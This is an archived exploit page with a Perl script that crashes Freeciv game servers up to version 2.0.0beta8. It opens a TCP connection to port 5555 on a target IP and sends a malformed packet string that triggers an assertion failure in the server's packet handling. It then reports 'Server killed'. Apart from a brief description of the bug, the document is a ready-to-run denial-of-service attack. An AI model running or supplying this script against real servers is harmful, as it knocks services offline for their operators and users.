<html><head><title>Freeciv Server <= 2.0.0beta8 Denial of Service Exploit</title></head><pre>#!/usr/bin/perl

# Freeciv Server &lt;= 2.0.0beta8 DoS exploit (windows&amp;linux releases)
# Vendor: http://www.freeciv.org/
# Advisory: Nico Spicher [ http://triplex.it-helpnet.de/ ]

# There is a vulnerability in the handling of incoming data. If the request
# is uncomplete or modified, the server crashes because of a bug in the
# get_packet_from_connection function in packets.c. Look at the code below
# for more information.

use IO::Socket;

if (@ARGV &lt; 1)
 {
system &quot;clear&quot;;
print &quot;[-] Usage: exploit_freeciv.pl &lt;host ip&gt;\n&quot;;
exit(1);
 }
system &quot;clear&quot;;

$server = $ARGV[0];
print &quot;[-] Freeciv DoS Exploit\n\n&quot;;
print &quot;[-] Server IP: &quot;;
print $server;
print &quot;\n[-] Connecting to IP ...\n&quot;;

$socket = IO::Socket::INET-&gt;new(
	Proto =&gt; &quot;tcp&quot;,
	PeerAddr =&gt; &quot;$server&quot;,
	PeerPort =&gt; &quot;5555&quot;); unless ($socket) { die &quot;[-] $server is offline\n&quot; }

print &quot;[-] Connected\n\n&quot;;

print &quot;[-] Creating string\n&quot;;

$string=&quot;@+2.0 conn_ping_info username_info-beta8&quot;;
# &gt;civserver: packets.c:385: get_packet_from_connection:
# 	      Assertion 'error == 0' failed.
# Aborted(core dumped)

print &quot;[-] Sending string\n\n&quot;;

print $socket &quot;$string&quot;;

print &quot;[&gt;] Attack successful - Server killed\n&quot;;

close($socket);

# milw0rm.com [2005-03-14]</pre></html>